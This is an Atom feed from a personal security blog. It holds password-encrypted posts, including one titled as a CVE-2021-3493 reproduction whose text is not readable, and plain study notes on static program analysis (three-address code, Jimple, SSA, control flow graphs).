<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>pz1o</title>
  
  <subtitle>pz1o</subtitle>
  <link href="https://pz1o.top/atom.xml" rel="self"/>
  
  <link href="https://pz1o.top/"/>
  <updated>2021-05-01T15:53:02.227Z</updated>
  <id>https://pz1o.top/</id>
  
  <author>
    <name>pz1o</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Flag</title>
    <link href="https://pz1o.top/2099/09/27/Flag/"/>
    <id>https://pz1o.top/2099/09/27/Flag/</id>
    <published>2099-09-27T15:15:44.000Z</published>
    <updated>2021-05-01T15:53:02.227Z</updated>
    
    <content type="html"><![CDATA[<script src="/crypto-js.js"></script><script src="/mcommon.js"></script><h3 id="encrypt-message">这个看不了，别看了</h3><link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap.min.css"> <link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap-theme.min.css"> <script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script> <script src="//cdn.bootcss.com/bootstrap/3.3.5/js/bootstrap.min.js"></script> <div id="security"> <div> <div class="input-group"> <input type="text" class="form-control" aria-label="Enter the password." id="pass"/> <div class="input-group-btn"> <button type="button" class="btn btn-default" onclick="decryptAES()">Decrypt</button> </div> </div> </div> </div> <div id="encrypt-blog" style="display:none"> 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 </div>]]></content>
    
    
    <summary type="html">这个看不了，别看了</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>PWN复现</title>
    <link href="https://pz1o.top/2099/04/01/PWN%E5%A4%8D%E7%8E%B0/"/>
    <id>https://pz1o.top/2099/04/01/PWN%E5%A4%8D%E7%8E%B0/</id>
    <published>2099-04-01T14:46:26.000Z</published>
    <updated>2021-04-27T14:25:58.967Z</updated>
    
    <content type="html"><![CDATA[<script src="/crypto-js.js"></script><script src="/mcommon.js"></script><h3 id="encrypt-message">Please enter the password to read the blog.</h3><link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap.min.css"> <link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap-theme.min.css"> <script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script> <script src="//cdn.bootcss.com/bootstrap/3.3.5/js/bootstrap.min.js"></script> <div id="security"> <div> <div class="input-group"> <input type="text" class="form-control" aria-label="Enter the password." id="pass"/> <div class="input-group-btn"> <button type="button" class="btn btn-default" onclick="decryptAES()">Decrypt</button> </div> </div> </div> </div> <div id="encrypt-blog" style="display:none">  </div>]]></content>
    
    
    <summary type="html">The article has been encrypted, please enter your password to view.&lt;br&gt;</summary>
    
    
    
    
    <category term="PWN" scheme="https://pz1o.top/tags/PWN/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2021-3493复现</title>
    <link href="https://pz1o.top/2021/05/03/CVE-2021-3493%E5%A4%8D%E7%8E%B0/"/>
    <id>https://pz1o.top/2021/05/03/CVE-2021-3493%E5%A4%8D%E7%8E%B0/</id>
    <published>2021-05-03T11:36:49.000Z</published>
    <updated>2021-05-03T11:37:45.865Z</updated>
    
    <content type="html"><![CDATA[<script src="/crypto-js.js"></script><script src="/mcommon.js"></script><h3 id="encrypt-message">Please enter the password to read the blog.</h3><link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap.min.css"> <link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap-theme.min.css"> <script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script> <script src="//cdn.bootcss.com/bootstrap/3.3.5/js/bootstrap.min.js"></script> <div id="security"> <div> <div class="input-group"> <input type="text" class="form-control" aria-label="Enter the password." id="pass"> <div class="input-group-btn"> <button type="button" class="btn btn-default" onclick="decryptAES()">Decrypt</button> </div> </div> </div> </div> <div id="encrypt-blog" style="display:none"> U2FsdGVkX1+Zq1lMOuHX+/I2HgaCG4VMMhlBzr8lA6nBk3NNKNZGzBctsQq3H1weZ3dtbwasf5/VmJQ2Fs19EzuxrODMNg1naKB2vjHA0fEm0Q6tLYaXJMIDKN8st7VIdyfCZttvNG6r61l2eOGEOt8mQQ0N/stDwG9PsusQozk3jjK9UsZkQrzCYKIaQh5owN69VgWAgTuAfL48djRpHOYIeqwv7XPEwpJHwnJox+S6H9DE5c47ZkuAAZ5BAAmK9ZCH99FO4aJ829bONEpEbMNKiB+RChSG/s24B+frUNYvZPz50g5aZ6kYsfi6kihPlJh/U1RxhGk0PSI97JU6xyxLviaogYigr5JeXKYjXJ9oPxHsA8xZ3T68atNbZvan4oBQGI8i0uiaeHm8Axr8/TDO+4p1IV220CtGBQzo1oPT9QBBAWk4fFgvTsdfdMm9yQo15tJY3/CQ+uM5llbk+TAELdXJ01UTpJaJvjwNTLuU4OZ1KuXK06OCCO95znMh1lFch/0wEKY3V8U/S6T3sTT2hHfOtV4Le595HTEorjg7l4ehhjPcvEjoljnjPkOnrOy86iYXgqKo05vyDK+fRhjAtrjvDPLT+42gvWpB2IlV34AkUjXPVT8IrTnMQXM2YnNizfYAq1GWTwsGhRuAskjChu4WgU/EyDcNLyosvjInDsmyQ8T19RtuO2raLFLLbAU71VCWrQbGrAw3qhQvENmcPGnG9vQcnc8yeUruTwcQlh6nxH5ie5f/Um7p0Hbc6UA8uEVMP9vYqP9sPkNEmWfxSNcT2kAOT9NwVnfA34An+/ldooOnJgamm7mwDQVrD1DyhXFxNB1EFp6QStoel92clpD9Z4D/hIkGluU2ShYvxXndtHNkAHFd6IDFZyosA8nUeg+BVb9gWu8JUPp0/9QbLKxM7Ve//C3ly9VVqA1tTZtgCWej787I0yXcEy4MaYq6GlnRZtZWewdUBZ5k8LbptxYxrQWfXg0Eztv5e7Lai8se6wsubaz7wgxFkoPFbGgEvhz7Mx9rVQZPruOTFgEc9FO+lglrZsAGsKCKiee07IuQQg/5Y9LjoB56RT5qB9UJrJewkfM0yYOQE/kwsHh11wLF1vIQsgDUrnNdGgAUmL46oVYJP+qbDRTe5wuOBCL2H9j9s+b70qidruPB3tcENpQuVZ51+RFguRasllAgs+WZO0KftZheV30FwdUVj12pmmALDm0Hixf6mvWsWt5uDocnFeGN23LRUHQ+oy/vPaxqm/e6YorV2/1bjQ1oe348ry6rEblVDfRvaS4wSrf3UIdrmKES9/h1yf7Jxi3ysPe7hlK63/pte2OLd/3WqvMWouEyZd2CtYjYFUENrcELYRV/Hxu0on3VFQIPAb0Dg1AJzZBr5ftRQbKMwMK4fdURe9z1tFU9P261kp9kkawduPPPlKvVIne5w14KlyD34Dc6j1yLBhwz8FhJG9PrkUT8FYBYTJ9sokCNmUnmPNTsDU8ST9z3TonjD3Lj/Fh5o+LNmMzZoI+KCdyp+tI8JCGQ6vJjw0gtzaf5n7u1BDILF+pXEIZNuANkbMafaYb3XMxU+kWx9Jy/S8b0YiJyYLxRkO7R3ukVqAAU4Z9FYR1WsuS+rhnKberAHfOeg5Eq5C3k+QEAAQ57+yFCpgPNb45iBKChrZAP2wEoRMZ0qLVxap623V14JzsEp8Hhsg0= </div>]]></content>
    
    
    <summary type="html">The article has been encrypted, please enter your password to view.&lt;br&gt;</summary>
    
    
    
    
    <category term="CVE复现" scheme="https://pz1o.top/tags/CVE%E5%A4%8D%E7%8E%B0/"/>
    
  </entry>
  
  <entry>
    <title>static program</title>
    <link href="https://pz1o.top/2021/05/03/static-program/"/>
    <id>https://pz1o.top/2021/05/03/static-program/</id>
    <published>2021-05-03T08:16:11.000Z</published>
    <updated>2021-05-03T08:17:52.155Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x01-Static-Program-Analysis"><a href="#0x01-Static-Program-Analysis" class="headerlink" title="0x01 Static Program Analysis"></a>0x01 Static Program Analysis</h1><h2 id="1-introduction"><a href="#1-introduction" class="headerlink" title="1.introduction"></a>1.introduction</h2><p><img src="/2021/05/03/static-program/image-20210315224533888.png" alt="image-20210315224533888"></p><h2 id="2-sound-and-complete"><a href="#2-sound-and-complete" class="headerlink" title="2.sound and complete"></a>2.sound and complete</h2><p><img src="/2021/05/03/static-program/image-20210315231054502.png" alt="image-20210315231054502"></p><p><img src="/2021/05/03/static-program/image-20210315231536756.png" alt="image-20210315231536756"></p><h2 id="3-what-is-static-analysis"><a href="#3-what-is-static-analysis" class="headerlink" title="3.what is static analysis"></a>3.what is static analysis</h2><p>a view as this draw</p><p><img src="/2021/05/03/static-program/image-20210316000124963.png" alt="image-20210316000124963"></p><h2 id="4-abstraction-and-overapproximation"><a href="#4-abstraction-and-overapproximation" class="headerlink" title="4.abstraction and overapproximation"></a>4.abstraction and overapproximation</h2><p>first,abstraction</p><p><img src="/2021/05/03/static-program/image-20210316000642671.png" alt="image-20210316000642671"></p><p>next,transfer function</p><p><img src="/2021/05/03/static-program/image-20210316001346346.png" alt="image-20210316001346346"></p><p>it is similar to Symbolic execution</p><p><img src="/2021/05/03/static-program/image-20210316001430168.png" alt="image-20210316001430168"></p><p>last control flow.</p><p><img src="/2021/05/03/static-program/image-20210316001748641.png" alt="image-20210316001748641"></p><h1 id="0x02-Intermediate-Representation"><a href="#0x02-Intermediate-Representation" class="headerlink" title="0x02 Intermediate Representation"></a>0x02 Intermediate Representation</h1><h2 id="1-Compiler"><a href="#1-Compiler" class="headerlink" title="1.Compiler"></a>1.Compiler</h2><p><img src="/2021/05/03/static-program/image-20210316010120880.png" alt="image-20210316010120880"></p><h2 id="2-AST-vs-IR"><a href="#2-AST-vs-IR" class="headerlink" title="2.AST vs IR"></a>2.AST vs IR</h2><p><img src="/2021/05/03/static-program/image-20210316010715717.png" alt="image-20210316010715717"></p><h2 id="3-3-Address-Code"><a href="#3-3-Address-Code" class="headerlink" title="3.3-Address Code"></a>3.3-Address Code</h2><p><img src="/2021/05/03/static-program/image-20210316010948812.png" alt="image-20210316010948812"></p><p><strong>Forms</strong></p><p><img src="/2021/05/03/static-program/image-20210316012707595.png" alt="image-20210316012707595"></p><h2 id="4-Soot-‘s-‘Jimple"><a href="#4-Soot-‘s-‘Jimple" class="headerlink" title="4.Soot ‘s ‘Jimple"></a>4.Soot ‘s ‘Jimple</h2><h3 id="for"><a href="#for" class="headerlink" title="for"></a>for</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ForLoop3AC</span></span>&#123;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line"><span class="keyword">int</span> x=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">10</span>;i++)&#123;</span><br><span class="line">x = x+<span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2021/05/03/static-program/image-20210316012632094.png" alt="image-20210316012632094"></p><h3 id="do…while"><a href="#do…while" class="headerlink" title="do…while"></a>do…while</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">DoWhileLoop3AC</span></span>&#123;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line"><span class="keyword">int</span>[] arr = <span class="keyword">new</span> <span class="keyword">int</span>[<span class="number">10</span>];</span><br><span class="line"><span class="keyword">int</span> i=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">do</span>&#123;</span><br><span class="line">i = i+<span class="number">1</span>;</span><br><span class="line">&#125;<span class="keyword">while</span>(arr[i]&lt;<span class="number">10</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2021/05/03/static-program/image-20210316013150012.png" alt="image-20210316013150012"></p><blockquote><p>$代表临时变量</p></blockquote><h3 id="method-call"><a href="#method-call" class="headerlink" title="method call"></a>method call</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MethodCall3AC</span></span>&#123;</span><br><span class="line"><span class="function">String <span class="title">foo</span><span class="params">(String para1, String para2)</span></span>&#123;</span><br><span class="line"><span class="keyword">return</span> para1 + <span class="string">" "</span> + para2;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String []args)</span></span>&#123;</span><br><span class="line">MethodCall3AC mc = <span class="keyword">new</span> MethodCall3AC();</span><br><span class="line">    String result = mc.foo(<span class="string">"hello"</span>,<span class="string">"world"</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p><code>method signature</code>:class name/return type/method name(parameter1 type,parameter2 type…)</p><p><img src="/2021/05/03/static-program/image-20210316125222155.png" alt="image-20210316125222155"></p></blockquote><p><img src="/2021/05/03/static-program/image-20210316124211598.png" alt="image-20210316124211598"></p><p><img src="/2021/05/03/static-program/image-20210316124243765.png" alt="image-20210316124243765"></p><h3 id="class"><a href="#class" class="headerlink" title="class"></a>class</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Class3AC</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">double</span> pi = <span class="number">3.14</span>;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2021/05/03/static-program/image-20210316125913305.png" alt="image-20210316125913305"></p><h2 id="5-SSA-Static-Single-Assignment"><a href="#5-SSA-Static-Single-Assignment" class="headerlink" title="5.SSA(Static Single Assignment)"></a>5.SSA(Static Single Assignment)</h2><p>Every variable has exactly one definition</p><p>function to deal with two or many variables</p><p><img src="/2021/05/03/static-program/image-20210316130354246.png" alt="image-20210316130354246"></p><h2 id="6-Control-Flow-Graph"><a href="#6-Control-Flow-Graph" class="headerlink" title="6.Control Flow Graph"></a>6.Control Flow Graph</h2><p>Nodes:BBs</p><p>Edge</p><p><img src="/2021/05/03/static-program/image-20210316130826596.png" alt="image-20210316130826596"></p><h3 id="Basic-Block"><a href="#Basic-Block" class="headerlink" title="Basic Block"></a>Basic Block</h3><p><strong>definition</strong></p><ol><li>It can be entered only at the beginning.</li><li>It can be exited only at the end</li><li>It should be a maximal.</li></ol><p><strong>how to build it</strong></p><p>determine leader </p><p><img src="/2021/05/03/static-program/image-20210316131723881.png" alt="image-20210316131723881"></p><p>eg:</p><p>这个例子太形象了，不得不用中文说一下</p><ol><li>first,determine leader(first instruction/jump target/follow jump)</li><li>build BBs</li></ol><p><img src="/2021/05/03/static-program/image-20210316132039750.png" alt="image-20210316132039750"></p><h3 id="Edge"><a href="#Edge" class="headerlink" title="Edge"></a>Edge</h3><p><strong>how to</strong></p><p>There are two cases</p><p><img src="/2021/05/03/static-program/image-20210316132843680.png" alt="image-20210316132843680"></p><h3 id="Example"><a href="#Example" class="headerlink" title="Example"></a>Example</h3><p><img src="/2021/05/03/static-program/image-20210316133326936.png" alt="image-20210316133326936"></p><h1 id="0x03Data-Flow-Analysis-Applications"><a href="#0x03Data-Flow-Analysis-Applications" class="headerlink" title="0x03Data Flow Analysis-Applications"></a>0x03Data Flow Analysis-Applications</h1><h2 id="1-Overview"><a href="#1-Overview" class="headerlink" title="1.Overview"></a>1.Overview</h2><p><img src="/2021/05/03/static-program/image-20210316162556579.png" 